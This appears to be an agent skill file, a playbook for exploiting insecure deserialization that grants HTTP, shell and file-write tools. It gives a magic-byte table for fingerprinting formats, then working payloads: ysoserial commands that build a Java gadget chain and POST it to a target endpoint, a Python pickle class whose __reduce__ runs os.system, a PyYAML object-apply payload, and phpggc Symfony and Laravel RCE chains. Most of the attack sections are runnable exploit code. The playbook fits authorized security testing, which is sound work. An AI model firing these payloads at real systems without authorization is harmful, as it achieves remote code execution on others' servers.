---
name: deserialize
description: Insecure-deserialization playbook — fingerprint the language/format (Java serialized, .NET BinaryFormatter, Python pickle, PHP unserialize, Node serialize, YAML/JSON-with-types), then build a working gadget chain.
allowed-tools:
  - http
  - shell
  - file_write
---

# Insecure deserialization playbook

## 1. Fingerprint the format
| Magic | Format |
|---|---|
| `rO0` / `\xac\xed\x00\x05` | Java serialized |
| `AAEAAAD/////` | .NET BinaryFormatter |
| `__VIEWSTATE` | ASP.NET ViewState |
| `gASV` / `gAR` / `gAP` | Python pickle |
| `O:` pattern | PHP serialize |
| `_$$ND_FUNC$$_` | Node node-serialize |
| `!!python/object` | YAML with type resolution |

## 2. Java
Toolkit: **ysoserial** (https://github.com/frohoff/ysoserial)
```sh
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
curl -X POST https://target/api/deserialize --data-binary @payload.bin
```
Chains: `CommonsCollections1..7`, `Spring1`, `Spring2`, `JRMPClient`, `URLDNS`.

## 3. .NET BinaryFormatter / Json.NET
Toolkit: **ysoserial.net** (https://github.com/pwntester/ysoserial.net)

## 4. Python pickle
```python
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ('id > /tmp/proof',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

### PyYAML
```yaml
!!python/object/apply:os.system ["id"]
```

## 5. PHP unserialize
Toolkit: **phpggc** (https://github.com/ambionics/phpggc)
```sh
phpggc -b Symfony/RCE4 system 'id'
phpggc Laravel/RCE6 system 'id'
```

## 6. Confirming impact
Use DNS/HTTP callback gadget first (e.g. `URLDNS` for Java). Then run `id` or read a non-sensitive file.

## 7. Reporting
Required:
- Format identified with magic-byte evidence
- The exact endpoint + parameter/cookie
- Working gadget payload
- Output of proof command
- Preconditions affecting exploitability
